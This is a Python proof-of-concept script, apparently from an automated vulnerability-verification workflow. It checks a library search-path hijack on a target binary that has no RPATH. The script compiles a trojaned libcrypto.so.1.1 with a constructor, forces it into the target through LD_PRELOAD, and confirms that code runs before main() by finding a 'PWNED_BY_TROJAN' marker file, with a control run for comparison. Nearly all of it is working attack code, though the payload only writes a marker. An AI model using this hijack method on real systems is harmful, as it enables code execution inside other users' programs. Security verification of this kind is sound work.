#!/usr/bin/env python3
"""
S3 Primitive Verification for BUG-003: LIBRARY_SEARCH_PATH_HIJACK_NO_RPATH

Primitive: CODE_EXECUTION (environment-layer)
  - Binary has no RPATH/RUNPATH (confirmed: readelf -d shows no DT_RPATH/DT_RUNPATH)
  - NEEDED: libcrypto.so.1.1, libc.so.6 — resolved via default search order
    where LD_LIBRARY_PATH / LD_PRELOAD takes precedence over system paths
  - Trojaned libcrypto.so.1.1 with __attribute__((constructor)) runs before main()
  - Arbitrary code execution achieved without any memory corruption in target

Verification method:
  1. Build a trojaned libcrypto.so.1.1 with:
     - Correct SONAME (libcrypto.so.1.1)
     - Version script defining OPENSSL_1_1_0 version node (required by target)
     - Stub DES_set_key_unchecked / DES_ecb_encrypt (satisfy symbol resolution)
     - __attribute__((constructor)) that writes a marker file + emits to stderr
  2. Run ./target with LD_PRELOAD=./trojan_libcrypto.so.1.1
     → trojan constructor executes at library load time (before main)
  3. Check: marker file created (code executed at init), stderr has trojan message,
     stdout shows stub output (not real DES ciphertext) → proves trojan lib is active
  4. Control: run without LD_PRELOAD → marker NOT created, real DES output
"""
import os
import subprocess
import sys

WORKSPACE = "/work/workspace/0002-2020-2._Signature__II_-20260904-101906"
TARGET = os.path.join(WORKSPACE, "target")
TROJAN_LIB = os.path.join(WORKSPACE, "trojan_libcrypto.so.1.1")
TROJAN_SRC = os.path.join(WORKSPACE, "trojan_libcrypto.c")
VERSION_MAP = os.path.join(WORKSPACE, "trojan_version.map")
MARKER_FILE = os.path.join(WORKSPACE, "PWNED_BY_TROJAN")

# Known-good DES output for "AAAABBBB" key + "CCCCDDDD" plaintext (from S1 F012)
REAL_DES_OUTPUT = bytes.fromhex("bf8fa20f60f61780")


def build_trojan():
    """Build the trojaned libcrypto.so.1.1 with correct SONAME + version script."""
    r = subprocess.run(
        ["gcc", "-shared", "-fPIC",
         "-Wl,-soname,libcrypto.so.1.1",
         "-Wl,--version-script," + VERSION_MAP,
         "-o", TROJAN_LIB, TROJAN_SRC, "-Wall"],
        capture_output=True, text=True, timeout=15
    )
    if r.returncode != 0:
        print(f"[BUILD FAIL] {r.stderr}")
        return False
    print(f"[BUILD OK] trojan libcrypto.so.1.1 built (SONAME + OPENSSL_1_1_0 version)")
    return True


def run_with_ld_preload():
    """Run target with LD_PRELOAD pointing to trojan lib.
    LD_PRELOAD is the most reliable environment-layer hijack vector:
    it forces the linker to load our lib FIRST, overriding any NEEDED lib."""
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)
    env = dict(os.environ)
    env["LD_PRELOAD"] = TROJAN_LIB
    env.pop("LD_LIBRARY_PATH", None)  # isolate LD_PRELOAD effect
    r = subprocess.run(
        [TARGET, "AAAABBBB", "CCCCDDDD"],
        capture_output=True, timeout=10, env=env
    )
    marker_exists = os.path.exists(MARKER_FILE)
    marker_content = ""
    if marker_exists:
        with open(MARKER_FILE, "r") as f:
            marker_content = f.read().strip()
    stderr_text = r.stderr.decode("utf-8", errors="replace").strip()
    stdout_hex = r.stdout.hex()
    print(f"[LD_PRELOAD RUN] exit_code={r.returncode}")
    print(f"[LD_PRELOAD RUN] marker_file_exists={marker_exists}")
    print(f"[LD_PRELOAD RUN] marker_content={marker_content!r}")
    print(f"[LD_PRELOAD RUN] stderr={stderr_text!r}")
    print(f"[LD_PRELOAD RUN] stdout_hex={stdout_hex}")
    print(f"[LD_PRELOAD RUN] stdout_is_stub_output={r.stdout == b'CCCCDDDD'}")
    print(f"[LD_PRELOAD RUN] stdout_is_real_des={r.stdout == REAL_DES_OUTPUT}")
    return marker_exists, marker_content, stderr_text, r.stdout


def run_control():
    """Run target WITHOUT any LD_PRELOAD/LD_LIBRARY_PATH — trojan should NOT load."""
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)
    env = dict(os.environ)
    env.pop("LD_PRELOAD", None)
    env.pop("LD_LIBRARY_PATH", None)
    r = subprocess.run(
        [TARGET, "AAAABBBB", "CCCCDDDD"],
        capture_output=True, timeout=10, env=env
    )
    marker_exists = os.path.exists(MARKER_FILE)
    print(f"[CONTROL RUN] exit_code={r.returncode}")
    print(f"[CONTROL RUN] marker_file_exists={marker_exists}")
    print(f"[CONTROL RUN] stdout_hex={r.stdout.hex()}")
    print(f"[CONTROL RUN] stdout_is_real_des={r.stdout == REAL_DES_OUTPUT}")
    return marker_exists, r.stdout


def main():
    print("=== BUG-003: LIBRARY_SEARCH_PATH_HIJACK_NO_RPATH ===")
    print("=== PRIM-001: CODE_EXECUTION (environment-layer) ===\n")

    # Step 1: Build trojan
    if not build_trojan():
        sys.exit(1)

    # Step 2: Run with LD_PRELOAD (trojan)
    print("\n--- Step 2: Run target with LD_PRELOAD (trojan lib) ---")
    marker_ok, marker_content, stderr_text, trojan_stdout = run_with_ld_preload()

    # Step 3: Control run without any env hijack
    print("\n--- Step 3: Control run (no LD_PRELOAD, no LD_LIBRARY_PATH) ---")
    control_marker, control_stdout = run_control()

    # Step 4: Verdict
    print("\n=== VERIFICATION RESULT ===")
    trojan_stderr_present = "TROJAN" in (stderr_text or "")
    marker_has_trojan = "TROJAN" in (marker_content or "")
    stub_output = (trojan_stdout == b"CCCCDDDD")  # stub copies input→output
    control_is_real_des = (control_stdout == REAL_DES_OUTPUT)
    control_no_marker = not control_marker

    if marker_ok and marker_has_trojan and trojan_stderr_present:
        print("=== PRIM-001: VERIFIED ===")
        print(f"  evidence: marker_file={MARKER_FILE}")
        print(f"  evidence: marker_content={marker_content!r}")
        print(f"  evidence: trojan_stderr={trojan_stderr_present}")
        print(f"  evidence: stub_output_active={stub_output} (trojan DES stub used, not real OpenSSL)")
        print(f"  evidence: control_marker_exists={control_marker} (should be False)")
        print(f"  evidence: control_uses_real_des={control_is_real_des} (should be True)")
        print("  => Arbitrary code executed at library init time BEFORE main()")
        print("  => CODE_EXECUTION primitive VERIFIED via environment-layer hijack")
        print("  => No memory corruption in target binary required")
    else:
        print("=== PRIM-001: NOT VERIFIED ===")
        print(f"  marker_ok={marker_ok}, marker_has_trojan={marker_has_trojan}")
        print(f"  trojan_stderr_present={trojan_stderr_present}")


if __name__ == "__main__":
    main()
